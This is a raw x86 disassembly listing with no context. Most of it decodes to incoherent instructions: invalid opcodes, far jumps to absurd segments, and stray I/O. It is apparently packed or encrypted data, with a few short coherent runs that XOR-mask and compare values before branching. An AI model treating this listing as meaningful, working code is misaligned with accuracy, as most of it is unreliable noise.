  411a32:	jmp    0x2201:0xbf50dc1e
  411a39:	ficom  WORD PTR ss:[edx-0x2b]
  411a3d:	and    eax,0xe90bab37
  411a42:	cli    
  411a43:	shl    ah,cl
  411a45:	pushf  
  411a46:	mov    edi,0xb6edc907
  411a4b:	dec    esi
  411a4c:	lea    eax,ds:0x7e20c91e
  411a52:	jo     0x4119e5
  411a54:	shl    BYTE PTR [edx],0x24
  411a57:	bound  edx,QWORD PTR [edi]
  411a59:	ror    BYTE PTR [edi-0x66],cl
  411a5c:	inc    ebp
  411a5d:	stos   DWORD PTR es:[edi],eax
  411a5e:	popf   
  411a5f:	mov    DWORD PTR [eax+0x42],esi
  411a62:	and    esi,DWORD PTR [esi+0x66ffa6bf]
  411a68:	mov    dh,0x87
  411a6a:	mul    eax
  411a6c:	jo     0x411a88
  411a6e:	loop   0x411a3b
  411a70:	out    0x9c,al
  411a72:	loopne 0x4119f4
  411a74:	popa   
  411a75:	pop    ebp
  411a76:	test   DWORD PTR [edx],edx
  411a78:	out    dx,al
  411a79:	(bad)  
  411a7a:	(bad)  
  411a7b:	mov    edx,ecx
  411a7d:	inc    ecx
  411a7e:	stos   DWORD PTR es:[edi],eax
  411a7f:	jns    0x411a87
  411a81:	xor    eax,0x530d9898
  411a86:	ja     0x411b06
  411a88:	fadd   st(2),st
  411a8a:	arpl   bx,ax
  411a8c:	push   ebx
  411a8d:	data16 sbb al,0x4f
  411a90:	ds jo  0x411ad2
  411a93:	xchg   esi,eax
  411a94:	sbb    cl,BYTE PTR [ecx-0x151544ad]
  411a9a:	mov    esp,0xe7e7bdef
  411a9f:	mov    ebp,0x3810f71a
  411aa4:	sbb    BYTE PTR [ecx-0x488ecc4c],cl
  411aaa:	add    DWORD PTR [edx+0x35],edi
  411aad:	call   FWORD PTR [edi]
  411aaf:	out    dx,al
  411ab0:	pop    ebx
  411ab2:	enter  0x5057,0xc2
  411ab6:	mov    al,BYTE PTR [eax-0x1e7ee73c]
  411abc:	jo     0x411ad0
  411abe:	jb     0x411b20
  411ac0:	add    al,0xff
  411ac2:	loop   0x411a94
  411ac4:	inc    ebp
  411ac5:	call   0xd42eb0d2
  411aca:	push   es
  411acb:	xchg   edi,eax
  411acc:	mov    ebp,0x3a72bfd3
  411ad1:	fchs   
  411ad3:	repz push es
  411ad5:	jno    0x411ac4
  411ad7:	or     DWORD PTR [ebx],0x59f5f1c6
  411add:	mov    edx,0xfa43e2a9
  411ae2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ae3:	rcl    esi,cl
  411ae5:	mov    bh,0x99
  411ae7:	fdivr  st,st(2)
  411ae9:	jp     0x411b22
  411aeb:	xor    DWORD PTR [ecx-0x5cc60b34],0x5ffa359b
  411af5:	ret    0x4589
  411af8:	adc    ah,dl
  411afa:	jne    0x411ab9
  411afc:	outs   dx,BYTE PTR ds:[esi]
  411afd:	(bad)  
  411afe:	pop    edi
  411aff:	push   eax
  411b00:	cmp    DWORD PTR [ecx+eiz*4+0x25],esi
  411b04:	jecxz  0x411a8f
  411b06:	xlat   BYTE PTR ds:[ebx]
  411b07:	sub    DWORD PTR [edi+0x5c2359b5],ecx
  411b0d:	clc    
  411b0e:	sbb    al,0xd5
  411b10:	mov    dh,0x50
  411b12:	fsubr  DWORD PTR [edx+0x3afc44b7]
  411b18:	or     al,BYTE PTR [esi+0x235f4ec5]
  411b1e:	and    eax,0xd45009ba
  411b23:	dec    edi
  411b24:	xor    ah,BYTE PTR [ebp-0x1ef9ba29]
  411b2a:	or     BYTE PTR [esi+0x61],dl
  411b2d:	ins    DWORD PTR es:[edi],dx
  411b2e:	ds retf 
  411b30:	and    edi,esp
  411b32:	scas   eax,DWORD PTR es:[edi]
  411b33:	shl    DWORD PTR [eax+edx*2+0x37],1
  411b37:	cmp    al,0xaf
  411b39:	cmp    al,0x5c
  411b3b:	push   esi
  411b3c:	xor    dl,bl
  411b3e:	dec    DWORD PTR [edx]
  411b40:	mov    dl,ch
  411b42:	out    0x1b,al
  411b44:	fisubr WORD PTR [ebx+0x7731f5f1]
  411b4a:	cmp    al,BYTE PTR [ebx+0x18]
  411b4d:	rcl    bh,1
  411b4f:	rcl    BYTE PTR [edi],1
  411b51:	enter  0x501e,0x42
  411b55:	mov    edi,0xe6175ee7
  411b5a:	dec    DWORD PTR [ebx-0x4ee0814]
  411b60:	pop    ecx
  411b61:	mov    bl,0xa5
  411b63:	xchg   ebx,eax
  411b64:	shl    DWORD PTR [ebx+0xf129539],cl
  411b6a:	jmp    0x6880:0x67d2d569
  411b71:	fld    DWORD PTR [edx+0x5c]
  411b74:	push   ebx
  411b75:	and    ebx,DWORD PTR [edx-0x731374c8]
  411b7b:	push   0x60
  411b7d:	mov    esi,0x1f1c5160
  411b82:	pop    si
  411b84:	dec    edi
  411b85:	cmp    BYTE PTR [edx+0x734ad8e7],dh
  411b8b:	outs   dx,BYTE PTR ds:[esi]
  411b8c:	xchg   BYTE PTR [edx],dh
  411b8e:	add    BYTE PTR [edi],dl
  411b90:	test   BYTE PTR [ecx-0x6e],dh
  411b93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b94:	mov    ebx,edi
  411b96:	or     ebx,0x66
  411b99:	mov    dl,0x14
  411b9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b9c:	outs   dx,BYTE PTR ds:[esi]
  411b9d:	lods   eax,DWORD PTR ds:[esi]
  411b9e:	push   edi
  411b9f:	fsubr  QWORD PTR [edx-0x53b9fff4]
  411ba5:	jns    0x411b33
  411ba7:	leave  
  411ba8:	mov    ds:0xfb8fdb17,al
  411bad:	xchg   BYTE PTR [eax+0x727c2ff5],al
  411bb3:	nop
  411bb4:	cwde   
  411bb5:	hlt    
  411bb6:	es retf 
  411bb8:	les    eax,FWORD PTR [ecx-0x174591]
  411bbe:	xchg   esi,eax
  411bbf:	in     al,dx
  411bc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411bc1:	fisttp WORD PTR [ecx+edi*1]
  411bc4:	jns    0x411b50
  411bc6:	ret    0xfc34
  411bc9:	(bad)  
  411bca:	lods   eax,DWORD PTR ds:[esi]
  411bcb:	or     DWORD PTR [edx+0x73f3721a],0xffffffa3
  411bd2:	or     BYTE PTR [eax+edx*1-0x6f6792a8],cl
  411bd9:	int    0xab
  411bdb:	pop    edx
  411bdc:	retf   0x7a3d
  411bdf:	jmp    0x9c26:0x83a6aee5
  411be6:	arpl   bx,ax
  411be8:	dec    esp
  411be9:	or     cl,BYTE PTR [ebx+0x5d]
  411bec:	lds    ecx,FWORD PTR [ebx+0xbb95c2]
  411bf2:	pop    ebx
  411bf3:	ror    BYTE PTR [esi+0x1e],0x9c
  411bf7:	scas   eax,DWORD PTR es:[edi]
  411bf8:	aas    
  411bf9:	repz xor dh,0xbb
  411bfd:	es adc al,0xae
  411c00:	jge    0x411c32
  411c02:	and    esi,DWORD PTR [ebx]
  411c04:	inc    ebp
  411c05:	jg     0x411c53
  411c07:	mov    ah,BYTE PTR [ecx]
  411c09:	repz and al,al
  411c0c:	pop    ebp
  411c0d:	jl     0x411c72
  411c0f:	pushf  
  411c10:	mov    al,ds:0x313fbe0d
  411c15:	inc    edx
  411c16:	in     al,dx
  411c17:	push   esp
  411c18:	aad    0xac
  411c1a:	(bad)  
  411c1c:	dec    eax
  411c1d:	es stc 
  411c1f:	popf   
  411c20:	sub    al,0x82
  411c22:	sahf   
  411c23:	in     al,dx
  411c24:	dec    esp
  411c25:	outs   dx,BYTE PTR ds:[esi]
  411c26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c27:	repz cwde 
  411c29:	pop    ecx
  411c2a:	push   eax
  411c2b:	fnstenv [ebx+0x738dc3e8]
  411c31:	test   DWORD PTR [eax],ebp
  411c33:	repz adc cl,BYTE PTR [ebx+0x19711750]
  411c3a:	xchg   BYTE PTR [eax+0x41],dl
  411c3d:	push   es
  411c3e:	rcr    DWORD PTR [ebx+esi*8+0x5b],cl
  411c42:	jmp    0x29fa9630
  411c47:	lahf   
  411c48:	xchg   DWORD PTR [edi],ebx
  411c4a:	lods   al,BYTE PTR ds:[esi]
  411c4b:	and    bh,BYTE PTR [esi-0x4cc9aff6]
  411c51:	mov    bl,BYTE PTR [edi-0x65]
  411c54:	fistp  QWORD PTR [ebp-0x5d]
  411c57:	xor    BYTE PTR [eax],bl
  411c59:	stos   BYTE PTR es:[edi],al
  411c5a:	add    BYTE PTR [ecx+edi*1+0x57a7cee0],dl
  411c61:	and    bl,BYTE PTR [esi-0x272b8820]
  411c67:	mov    edx,0xae887717
  411c6c:	mov    ecx,DWORD PTR [ebp-0x4c]
  411c6f:	mov    edx,DWORD PTR [ebp-0x60]
  411c72:	mov    esi,DWORD PTR [ebp-0x5c]
  411c75:	add    eax,0x7818
  411c7a:	adc    ecx,0x87
  411c80:	or     eax,edx
  411c82:	mov    edx,DWORD PTR [ebp-0x70]
  411c85:	jmp    0x411efa
  411c8a:	pop    ebp
  411c8b:	and    DWORD PTR [esi],esi
  411c8d:	xor    bh,BYTE PTR ds:[esi]
  411c90:	pop    ebp
  411c91:	sbb    bh,BYTE PTR [edi+edi*8-0x39c695f8]
  411c98:	pop    edi
  411c99:	jo     0x411cea
  411c9b:	push   0x18
  411c9d:	sbb    BYTE PTR [ecx+0x14],dh
  411ca0:	sbb    BYTE PTR [eax],bl
  411ca2:	aas    
  411ca3:	mov    ds:0xc1fc2e39,eax
  411ca8:	mov    ecx,0x23390d5f
  411cad:	jmp    DWORD PTR [edi+ecx*1+0x2f1193d0]
  411cb4:	scas   al,BYTE PTR es:[edi]
  411cb5:	sbb    BYTE PTR [edi+eiz*2],dh
  411cb8:	sbb    al,0x73
  411cba:	inc    edi
  411cbb:	fdivr  QWORD PTR [edx+0x53bc2f60]
  411cc1:	sahf   
  411cc2:	inc    ecx
  411cc3:	adc    al,0xa2
  411cc5:	pop    ebp
  411cc6:	ds int3 
  411cc8:	jno    0x411c78
  411cca:	adc    al,0x47
  411ccc:	xchg   dh,dh
  411cce:	pop    ebx
  411ccf:	into   
  411cd0:	lods   al,BYTE PTR ds:[esi]
  411cd1:	test   BYTE PTR [ebp+ecx*2-0x55],dh
  411cd5:	sar    DWORD PTR [esi+eax*4],cl
  411cd8:	add    edx,DWORD PTR [ebx-0x419930f6]
  411cde:	mov    ah,0x7c
  411ce0:	mov    eax,ds:0x25e0ad36
  411ce5:	add    BYTE PTR [ecx+0x41],dh
  411ce8:	fcmovu st,st(5)
  411cea:	inc    esp
  411ceb:	popa   
  411cec:	fisub  DWORD PTR [eax+0x6c]
  411cef:	call   0x9f22:0x1d6fcd1e
  411cf6:	rcl    DWORD PTR ds:0xda34b0f6,1
  411cfc:	adc    edx,DWORD PTR [eax]
  411cfe:	in     eax,0x13
  411d00:	loop   0x411d4e
  411d02:	inc    BYTE PTR [ebx-0x5d]
  411d05:	addr16 inc ebx
  411d07:	xor    esi,0xa0be0e6c
  411d0d:	cwde   
  411d0e:	pop    ebx
  411d0f:	lea    ebx,[ebp-0x402254df]
  411d15:	mov    WORD PTR [esi-0xee5f5b5],ds
  411d1b:	shl    BYTE PTR [ebp+esi*2-0x20eabd63],0xc3
  411d23:	push   cs
  411d24:	dec    ebx
  411d25:	cdq    
  411d26:	push   ebp
  411d27:	test   al,0x4e
  411d29:	mov    edi,0xfa9f972f
  411d2e:	fistp  WORD PTR [edx+0x33e1a59]
  411d34:	ins    BYTE PTR es:[edi],dx
  411d35:	add    ah,BYTE PTR [ecx-0x7ca94b18]
  411d3b:	xor    cl,BYTE PTR [edi+0x5e44201e]
  411d41:	jnp    0x411d25
  411d43:	rcl    edi,0xae
  411d46:	test   BYTE PTR [esi],dl
  411d48:	das    
  411d49:	loope  0x411d86
  411d4b:	in     al,0x12
  411d4d:	lea    esi,[edx+ecx*1]
  411d50:	les    esi,FWORD PTR [eax+0x107f1ac2]
  411d56:	(bad)  
  411d57:	ret    0x8edb
  411d5a:	xor    al,bl
  411d5c:	sbb    al,0xb7
  411d5e:	test   eax,0x69b0f370
  411d63:	clc    
  411d64:	fistp  DWORD PTR [ecx+0x69]
  411d67:	out    dx,eax
  411d68:	jle    0x411d31
  411d6a:	repz stc 
  411d6c:	ja     0x411de2
  411d6e:	mov    ecx,0xc4526a3e
  411d73:	and    DWORD PTR [eax],esi
  411d75:	outs   dx,BYTE PTR ds:[esi]
  411d76:	cmp    ah,cl
  411d78:	push   ebx
  411d79:	in     eax,dx
  411d7a:	inc    cx
  411d7c:	mov    al,0x2f
  411d7e:	push   esi
  411d7f:	cmp    BYTE PTR [esi+edx*1+0x637f9da],cl
  411d86:	jecxz  0x411d7f
  411d88:	stos   BYTE PTR es:[edi],al
  411d89:	mul    DWORD PTR [edi+edi*4]
  411d8c:	sub    ah,bl
  411d8e:	js     0x411dad
  411d90:	jg     0x411d14
  411d92:	cli    
  411d93:	les    ecx,FWORD PTR [esp+edi*8-0x638faa14]
  411d9a:	fiadd  DWORD PTR [ebp+0x5219bcf8]
  411da0:	fisttp WORD PTR [edi+0x42c45c8d]
  411da6:	inc    edi
  411da7:	loop   0x411d96
  411da9:	popf   
  411daa:	cwde   
  411dab:	shl    BYTE PTR [eax],1
  411dad:	mov    ecx,0x248bd569
  411db2:	push   0x590d38a3
  411db7:	retf   0x9ede
  411dba:	cmp    DWORD PTR [ebx-0x3748f56f],edx
  411dc0:	mov    al,bh
  411dc2:	mov    ah,0x4b
  411dc4:	data16 into 
  411dc6:	mov    eax,0x99f09c79
  411dcb:	dec    BYTE PTR [ebx-0x36]
  411dce:	cmp    ecx,DWORD PTR [ecx+edx*2-0x397397dd]
  411dd5:	dec    ebx
  411dd6:	mov    BYTE PTR [ebp-0x53c6e4c9],al
  411ddc:	call   0x4c7:0x7ce7c1e3
  411de3:	iret   
  411de4:	aas    
  411de5:	mov    al,ds:0xd36441b8
  411dea:	and    edi,ebp
  411dec:	xor    al,0x5
  411dee:	push   cs
  411def:	adc    ch,al
  411df1:	or     eax,0xa66b2dd9
  411df6:	mov    ah,BYTE PTR [ebp+0x60d29703]
  411dfc:	pop    ecx
  411dfd:	int    0xb0
  411dff:	add    DWORD PTR [edi],eax
  411e01:	in     eax,0x3f
  411e03:	inc    eax
  411e04:	popa   
  411e05:	fcom   DWORD PTR [eax-0x51]
  411e08:	jo     0x411db2
  411e0a:	jae    0x411e83
  411e0c:	mov    al,0xef
  411e0e:	addr16 push edx
  411e10:	sar    DWORD PTR [ecx+0x12981b82],1
  411e16:	fcmovb st,st(0)
  411e18:	fcomp  QWORD PTR [esp+eiz*2]
  411e1b:	int    0x56
  411e1d:	sub    cl,BYTE PTR [edi-0x51b6866e]
  411e23:	sbb    DWORD PTR [ebp+ebp*8+0x554d9d52],esp
  411e2a:	sbb    edi,DWORD PTR [edx+0x749f4c88]
  411e30:	loopne 0x411e33
  411e32:	inc    ebx
  411e33:	push   ss
  411e34:	mov    bh,0x72
  411e36:	retf   0x4159
  411e39:	pop    edi
  411e3a:	addr16 jp 0x411eac
  411e3d:	adc    dh,BYTE PTR [ebp-0xed80893]
  411e43:	or     eax,0xf15bab2
  411e48:	pop    esp
  411e49:	mov    ecx,0xfa5ae581
  411e4e:	cs in  al,dx
  411e50:	add    esp,esp
  411e52:	xchg   ebp,eax
  411e53:	daa    
  411e54:	push   edx
  411e55:	pop    esi
  411e56:	mov    edx,0xf022a1ae
  411e5b:	xchg   DWORD PTR [edx],edi
  411e5d:	mov    ch,0xfe
  411e5f:	pop    es
  411e60:	jns    0x411e10
  411e62:	sub    BYTE PTR [eax-0x43],ah
  411e65:	fidivr WORD PTR [esp+eax*8]
  411e68:	mov    eax,0x712ab6c4
  411e6d:	aad    0xe2
  411e6f:	fisttp DWORD PTR ds:0x2f6dcffb
  411e75:	das    
  411e76:	mov    eax,0x1b3c3755
  411e7b:	or     edi,DWORD PTR [esi]
  411e7d:	jo     0x411edb
  411e7f:	push   cs
  411e80:	loopne 0x411ec9
  411e82:	in     eax,0xee
  411e84:	cmp    BYTE PTR [eax+0x4931da7],0x29
  411e8b:	xor    eax,0x8802a056
  411e90:	jle    0x411ec7
  411e92:	jmp    0x411e9c
  411e94:	ret    
  411e95:	adc    al,0x2b
  411e97:	push   0x74
  411e99:	sbb    bh,cl
  411e9b:	sub    ebx,ecx
  411e9d:	imul   edx,DWORD PTR [eax-0x6a3d539e],0x33
  411ea4:	sub    al,0xe6
  411ea6:	mov    ah,0x59
  411ea8:	outs   dx,DWORD PTR ds:[esi]
  411ea9:	test   al,0x95
  411eab:	cmc    
  411eac:	pop    ebp
  411ead:	pop    ss
  411eae:	jg     0x411f1a
  411eb0:	pop    edi
  411eb1:	test   BYTE PTR [ebx+0x74a3434c],bl
  411eb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411eb8:	sbb    DWORD PTR [ecx-0x35],edx
  411ebb:	sbb    ah,ah
  411ebd:	dec    ebp
  411ebe:	pop    edx
  411ebf:	cld    
  411ec0:	mov    WORD PTR [esi],?
  411ec2:	icebp  
  411ec3:	(bad)
  411ec6:	push   edx
  411ec7:	push   esi
  411ec8:	hlt    
  411ec9:	nop
  411eca:	sahf   
  411ecb:	rcl    DWORD PTR ds:0xe6569cd3,cl
  411ed1:	adc    eax,0x3558a3bf
  411ed6:	adc    al,0x74
  411ed8:	stc    
  411ed9:	(bad)  
  411eda:	jmp    0x411e88
  411edc:	pop    DWORD PTR [ecx+0x6dac612e]
  411ee2:	or     eax,0x2e40547f
  411ee7:	ror    BYTE PTR [ecx-0x794ec4bb],cl
  411eed:	and    bl,ch
  411eef:	mov    BYTE PTR [esi-0x49fc1bf],cl
  411ef5:	adc    ecx,ebx
  411ef7:	popf   
  411ef8:	mov    ah,0x3f
  411efa:	or     ecx,esi
  411efc:	mov    esi,DWORD PTR [ebp-0x6c]
  411eff:	push   esi
  411f00:	push   edx
  411f01:	push   ecx
  411f02:	push   eax
  411f03:	call   0x416c20
  411f08:	mov    ecx,DWORD PTR [ebp-0x80]
  411f0b:	mov    esi,DWORD PTR [ebp-0x7c]
  411f0e:	and    eax,ecx
  411f10:	mov    ecx,DWORD PTR ds:0x422538
  411f16:	mov    ecx,DWORD PTR [ecx+0x1d0]
  411f1c:	mov    ecx,DWORD PTR [ecx]
  411f1e:	and    edx,esi
  411f20:	xor    eax,0x2b01
  411f25:	xor    edx,0x2021
  411f2b:	xor    esi,esi
  411f2d:	cmp    ecx,eax
  411f2f:	jne    0x4127da
  411f35:	cmp    esi,edx
  411f37:	jne    0x4127da
  411f3d:	mov    eax,DWORD PTR [ebp-0xa4]
  411f43:	mov    ecx,DWORD PTR [ebp-0xc]
  411f46:	add    eax,0x80ca
  411f4b:	or     eax,ecx
  411f4d:	mov    ecx,DWORD PTR ds:0x4225d4
  411f53:	or     eax,0x686
  411f58:	xor    eax,0x3eec
  411f5d:	lea    eax,[eax+ecx*1-0xc11b]
  411f64:	xor    DWORD PTR ds:0x4225cc,eax
  411f6a:	mov    eax,DWORD PTR [ebp-0x64]
  411f6d:	and    eax,0x4dff
  411f72:	add    eax,DWORD PTR [ebp-0x14]
  411f75:	mov    ecx,DWORD PTR [ebp-0x94]
  411f7b:	xor    eax,0x676c
  411f80:	xor    edx,edx
  411f82:	div    ecx
  411f84:	mov    ecx,DWORD PTR [ebp-0x24]
  411f87:	mov    edx,DWORD PTR [ebp-0x74]
  411f8a:	xor    ecx,0x6e1e
  411f90:	imul   ecx,edx
  411f93:	mov    edx,DWORD PTR [ebp+0x8]
  411f96:	push   0x4
  411f98:	jmp    0x41220d
  411f9d:	mov    gs,WORD PTR [esp+ecx*4-0x7c]
  411fa1:	push   0x64
  411fa3:	jle    0x411fff
  411fa5:	inc    ebp
  411fa6:	inc    ecx
  411fa7:	jne    0x412025
  411fa9:	dec    ebx
  411faa:	aad    0x2
  411fac:	push   0xffffffa6
  411fae:	data16 sbb BYTE PTR [eax],bl
  411fb1:	jno    0x411fc7
  411fb3:	sbb    BYTE PTR [eax],bl
  411fb5:	mov    bh,0xeb
  411fb7:	lds    ebp,FWORD PTR [eax]
  411fb9:	mov    WORD PTR [edi+0x5a2bc7fc],ss
  411fbf:	cwde   
  411fc0:	xor    ebx,0xa7e0011
  411fc6:	jp     0x411f79
  411fc8:	retf   
  411fc9:	mov    WORD PTR [edi+0x35],ds
  411fcc:	pop    edx
  411fcd:	sahf   
  411fce:	dec    edi
  411fcf:	(bad)  
  411fd0:	mov    ecx,0x2252ab15
  411fd5:	adc    eax,0x2b647715
  411fda:	lds    edx,FWORD PTR [eax+0x10]
  411fdd:	test   bh,ch
  411fdf:	push   esp
  411fe0:	pushf  
  411fe1:	outs   dx,DWORD PTR ds:[esi]
  411fe2:	adc    eax,0x76d5e687
  411fe7:	xchg   ebp,eax
  411fe8:	jnp    0x412026
  411fea:	test   BYTE PTR [eax],bh
  411fec:	jns    0x412055
  411fee:	adc    BYTE PTR [ebx],ah
  411ff0:	add    bl,bl
  411ff2:	pop    edx
  411ff3:	jmp    FWORD PTR [ecx]
  411ff5:	in     eax,dx
  411ff6:	fstp   DWORD PTR [esi+ebx*8]
  411ff9:	cmc    
  411ffa:	jmp    0x1d82:0x656fbbc2
  412001:	scas   al,BYTE PTR es:[edi]
  412002:	dec    esp
  412003:	xchg   edi,eax
  412004:	sub    eax,0x41d8c906
  412009:	pop    edi
  41200a:	int    0xd0
  41200c:	pop    ecx
  41200d:	lea    edx,[ebp+0x195ad217]
  412013:	jno    0x412063
  412015:	inc    ebx
  412016:	jnp    0x412066
  412018:	pop    edi
  412019:	push   0x5dc153bc
  41201e:	mov    al,0x53
  412020:	mov    ebp,0xa7ca0383
  412025:	jnp    0x411fbf
  412027:	mov    edx,0x2c8370fa
  41202c:	fwait
  41202d:	pusha  
  41202e:	(bad)  
  41202f:	mov    bl,0xf
  412031:	bound  esi,QWORD PTR [esp+esi*1]
  412034:	xor    edi,DWORD PTR [eax]
  412036:	mov    eax,ds:0x1a9918f0
  41203b:	and    cl,BYTE PTR [ebx-0x6ace88b7]
  412041:	pop    ebp
  412042:	fadd   st,st(1)
  412044:	xchg   ecx,eax
  412045:	mov    edi,0x87b3fd96
  41204a:	xlat   BYTE PTR ds:[ebx]
  41204b:	xchg   edx,eax
  41204c:	jp     0x411fdf
  41204e:	dec    ebx
  41204f:	mov    cl,0x2b
  412051:	dec    ecx
  412052:	arpl   WORD PTR [eax],bx
  412054:	fsubrp st(7),st
  412056:	push   esi
  412057:	je     0x411fdb
  412059:	ret    0xed81
  41205c:	inc    esi
  41205d:	add    esi,DWORD PTR ds:0xeaf1a298
  412063:	sub    ebp,DWORD PTR [ebp+0x67]
  412066:	jns    0x412065
  412068:	push   ebx
  412069:	(bad)  
  41206a:	xchg   esp,eax
  41206b:	addr16 js 0x41200e
  41206e:	leave  
  41206f:	dec    ecx
  412070:	xor    al,0xba
  412072:	push   edx
  412073:	fistp  WORD PTR [ecx]
  412075:	(bad)  [edx+0x1a1922f7]
  41207b:	cdq    
  41207c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41207d:	dec    ecx
  41207e:	and    al,0x95
  412080:	jmp    0x41200a
  412082:	jmp    0x4120c9
  412084:	ins    BYTE PTR es:[edi],dx
  412085:	fnsave [ecx+0x540da57b]
  41208b:	lock push es
  41208d:	push   es
  41208e:	xor    BYTE PTR [ecx],ah
  412090:	aam    0x9f
  412092:	mov    ebx,0x5e4626e5
  412097:	jmp    0xcbbd:0x34441e55
  41209e:	jge    0x412021
  4120a0:	dec    edx
  4120a1:	shr    DWORD PTR [esi+0x2d],1
  4120a4:	sbb    DWORD PTR [ebx-0x4340ce1e],esp
  4120aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4120ab:	mov    bl,0x7f
  4120ad:	imul   ebx,ebp,0xffffffa9
  4120b0:	(bad)  
  4120b1:	(bad)  
  4120b2:	ins    BYTE PTR es:[edi],dx
  4120b3:	add    al,0xa5
  4120b5:	jnp    0x4120af
  4120b7:	dec    ecx
  4120b8:	fistp  QWORD PTR [eax]
  4120ba:	add    BYTE PTR [edi],dl
  4120bc:	mov    dh,0xca
  4120be:	inc    edx
  4120bf:	ds in  al,dx
  4120c1:	mov    ch,0x12
  4120c3:	lods   eax,DWORD PTR ds:[esi]
  4120c4:	jno    0x4120b8
  4120c6:	and    al,0x35
  4120c8:	pop    edi
  4120c9:	hlt    
  4120ca:	addr16 jmp 0xe98c:0xce2ce037
  4120d2:	cli    
  4120d3:	push   es
  4120d4:	add    DWORD PTR [edx-0x17ad4982],edx
  4120da:	out    dx,al
  4120db:	out    0x36,eax
  4120dd:	sar    DWORD PTR [edx+0x16],cl
  4120e0:	mov    ebx,0x4d0982d0
  4120e5:	push   ds
  4120e6:	aas    
  4120e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4120e8:	lods   eax,DWORD PTR ds:[esi]
  4120e9:	cli    
  4120ea:	xor    al,0x22
  4120ec:	jge    0x4120f5
  4120ee:	pop    esi
  4120ef:	bound  edi,QWORD PTR cs:[edx+0x996d279]
  4120f6:	pusha  
  4120f7:	dec    esp
  4120f8:	inc    edi
  4120f9:	mov    ebp,esp
  4120fb:	enter  0x1ab5,0x2
  4120ff:	mov    edx,0xd00ddd3
  412104:	shl    DWORD PTR [ecx+0x3e],1
  412107:	call   0x1195:0x2de41830
  41210e:	dec    ebx
  41210f:	ja     0x41211e
  412111:	cmp    DWORD PTR [edi+edi*1+0x6943c8aa],edi
  412118:	jb     0x41212c
  41211a:	in     al,dx
  41211b:	in     eax,0x6
  41211d:	pop    ebx
  41211e:	xor    eax,0xdec77a14
  412123:	jmp    0x412172
  412125:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412126:	aas    
  412127:	aaa    
  412128:	scas   al,BYTE PTR es:[edi]
  412129:	fcom   DWORD PTR [esi]
  41212b:	jne    0x4120dc
  41212d:	or     DWORD PTR [ebp+0x56],esp
  412130:	jmp    0x412184
  412132:	xchg   esp,eax
  412133:	dec    esp
  412134:	mov    dh,0x9
  412136:	leave  
  412137:	sahf   
  412138:	test   DWORD PTR ds:0x670e76e6,edx
  41213e:	mov    al,ds:0x94e84cc9
  412143:	adc    ecx,DWORD PTR ds:0x58226e86
  412149:	loopne 0x4121a5
  41214b:	fnstsw WORD PTR [ebp-0x46]
  41214e:	in     al,0xc5
  412150:	pop    esp
  412151:	sub    al,0x58
  412153:	in     eax,dx
  412154:	jp     0x412185
  412156:	push   esp
  412157:	imul   esi,DWORD PTR [ebx+0x69],0xc0cdf62a
  41215e:	or     eax,0xb5844a7b
  412163:	xchg   ecx,eax
  412164:	lock ret 0x768f
  412168:	in     al,0xdb
  41216a:	or     esp,eax
  41216c:	lds    esp,FWORD PTR [ebp+0xb9eebe4]
  412172:	xor    BYTE PTR [esi],ah
  412174:	jbe    0x4121cb
  412176:	nop
  412177:	and    DWORD PTR [ecx],0xb9687723
  41217d:	mov    esi,0xd185564d
  412182:	adc    eax,DWORD PTR es:[ecx]
  412185:	ins    DWORD PTR es:[edi],dx
  412186:	cmp    BYTE PTR [ecx-0x42],ah
  412189:	into   
  41218a:	adc    eax,edx
  41218c:	jmp    0x412174
  41218e:	sbb    bh,cl
  412190:	sti    
  412191:	xor    BYTE PTR [eax],dh
  412193:	nop
  412194:	shr    DWORD PTR [eax+edi*8],1
  412197:	jg     0x412147
  412199:	test   DWORD PTR [edi-0x35],0xeb32794d
  4121a0:	jle    0x41214a
  4121a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121a3:	leave  
  4121a4:	aad    0xeb
  4121a6:	mov    edi,0xc5b01329
  4121ab:	xor    BYTE PTR [edi],ah
  4121ad:	jmp    0x412167
  4121af:	lds    esp,FWORD PTR [edi+edx*4]
  4121b2:	xor    bh,BYTE PTR [edi-0x5269a580]
  4121b8:	mov    edi,0xb3283f08
  4121bd:	outs   dx,BYTE PTR ds:[esi]
  4121be:	push   ebp
  4121bf:	not    BYTE PTR [esi]
  4121c1:	pop    ds
  4121c2:	lds    edx,FWORD PTR [esi-0x37bc2f77]
  4121c8:	xlat   BYTE PTR ds:[ebx]
  4121c9:	stc    
  4121ca:	mov    dl,0x5
  4121cc:	dec    esp
  4121cd:	sub    dl,BYTE PTR [edi]
  4121cf:	jns    0x4121bc
  4121d1:	(bad)  
  4121d2:	push   ss
  4121d3:	ror    BYTE PTR [ebx],1
  4121d5:	scas   eax,DWORD PTR es:[edi]
  4121d6:	xchg   ebx,eax
  4121d7:	imul   ebx,esp,0xb5c9c0f7
  4121dd:	jbe    0x412204
  4121df:	bound  ebx,QWORD PTR ds:0x821760f4
  4121e5:	xchg   ebp,eax
  4121e6:	je     0x412254
  4121e8:	sbb    DWORD PTR [ebp-0x70],edi
  4121eb:	pop    ebp
  4121ec:	cmp    al,0x57
  4121ee:	inc    ecx
  4121ef:	xor    ah,dl
  4121f1:	fcmovbe st,st(3)
  4121f3:	(bad)  
  4121f4:	jno    0x41220a
  4121f6:	sbb    DWORD PTR [ebx-0x4],edx
  4121f9:	mov    dl,0xb7
  4121fb:	in     eax,dx
  4121fc:	or     edx,DWORD PTR ds:0x23762e6f
  412202:	push   esi
  412203:	out    dx,al
  412204:	add    ecx,DWORD PTR [edx+eax*8-0x20700132]
  41220b:	sbb    ebx,DWORD PTR [edx+0x68]
  41220e:	and    BYTE PTR [ebx-0x3d],bh
  412211:	in     al,0x35
  412213:	test   BYTE PTR [eax],bh
  412215:	add    BYTE PTR [eax],al
  412217:	mov    eax,DWORD PTR [eax+edx*1]
  41221a:	lea    ecx,[eax+ecx*1-0x27c6df8a]
  412221:	mov    eax,DWORD PTR [ebp-0x34]
